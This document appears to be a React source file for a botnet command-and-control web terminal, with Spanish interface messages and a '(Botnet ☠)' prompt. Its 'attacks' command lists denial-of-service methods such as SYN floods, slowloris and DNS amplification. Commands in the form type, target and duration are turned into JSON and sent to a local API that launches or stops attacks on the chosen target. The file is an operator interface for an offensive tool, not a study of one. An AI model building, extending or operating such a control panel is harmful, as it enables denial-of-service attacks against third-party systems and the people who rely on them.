import React, { useState, useEffect, useRef } from 'react';
import './Terminal.css';
import Cookies from 'js-cookie';
import { useAuthStore } from '../../hooks';

export const BotnetTerminal = () => {
  const [input, setInput] = useState('');
  const [visibleHistory, setVisibleHistory] = useState([]);
  const [fullHistory, setFullHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(null);
  const inputRef = useRef(null);

  const {startLogOut} = useAuthStore()


  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.ctrlKey && e.key.toLowerCase() === 'l') {
        e.preventDefault();
        setVisibleHistory([]);
        return;
      }

      if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (fullHistory.length === 0) return;

        const newIndex = historyIndex === null
          ? fullHistory.length - 1
          : Math.max(0, historyIndex - 1);

        setInput(fullHistory[newIndex]?.command || '');
        setHistoryIndex(newIndex);
      }

      if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (fullHistory.length === 0) return;

        const newIndex = historyIndex === null
          ? 0
          : Math.min(fullHistory.length - 1, historyIndex + 1);

        setInput(fullHistory[newIndex]?.command || '');
        setHistoryIndex(newIndex);
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [historyIndex, fullHistory]);

  const handleClick = () => inputRef.current?.focus();

  const customCommand = async (command) => {

    const array_cmd = command.split(" ")
    
    let body={};
    switch(array_cmd.length){
      case 1:
        body=JSON.stringify({stop_attack:''}) 
        console.log(body);
        break;
        case 3:
          console.log(body);
          const [ type, target, duration] = array_cmd;
          const attack={
            type,
            target,
            duration
          };
          
          body=JSON.stringify({attack}) 
          break;

    }

    try {
      const response = await fetch(`http://localhost:4000/api/rcv/cpanel/all`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-token':`${Cookies.get('x-token')}`},
        body: body
      });

      if (!response.ok) throw new Error(`Error del servidor: ${response.status}`);
      
      const data = await response.json();

      if (data.msg === "Autenticación inválida") {
        alert("Autenticación inválida");
        startLogOut();
      }
      return data;
    } catch (error) {
      console.error('Error en customCommand:', error);
      return { result: 'Hubo un error ejecutando el comando.' };
    }
  };

  const executeCommand = async (command) => {
    if (!command.trim()) return;

    let response = '';

    switch (command) {
      case 'help':
        response = 'Comandos disponibles: help, about, clear, history, attacks';
        break;
      case 'about':
        response = 'Botnet';
        break;
      case 'clear':
        setVisibleHistory([]);
        setInput('');
        return;
      case 'history':
        response = fullHistory.map((h, i) => `${i + 1}: ${h.command}`).join('\n');
        break;

      case 'attacks':

        response = `
          tcp_flood <target> <duration>
          udp_flood <target> <duration>
          http_flood <target> <duration>
          slowloris <target> <duration>
          syn_flood <target> <duration>
          icmp_flood <target> <duration>
          dns_amplification <target> <duration>
        `;
        break;
        
      default: {
        const data = await customCommand(command);
        
        //response = data.result;
        //break;
      }
    }

    const newEntry = { command, response };
    setFullHistory([...fullHistory, newEntry]);
    setVisibleHistory([...visibleHistory, newEntry]);
    setInput('');
    setHistoryIndex(null);
    inputRef.current?.focus();
  };

  const handleCommand = async (e) => {
    e.preventDefault();
    await executeCommand(input);
  };



  return (
    <div className="terminal-container" onClick={handleClick}>
      <div className="terminal-header">
        <span className="terminal-dot red" />
        <span className="terminal-dot yellow" />
        <span className="terminal-dot green" />
      </div>
      <div className="terminal-body">
        {visibleHistory.map((entry, idx) => (
          <div key={idx}>
            <div className="terminal-line">
              <span className="prompt">(Botnet ☠) &gt;</span>
              <span>{entry.command}</span>
            </div>
            <div className="terminal-response">{entry.response}</div>
          </div>
        ))}
        <form onSubmit={handleCommand}>
          <div className="terminal-line">
            <span className="prompt">(Botnet ☠) &gt;</span>
            <input
              type="text"
              ref={inputRef}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              autoFocus
              className="terminal-input"
            />
          </div>
        </form>
      </div>
    </div>
  );
};
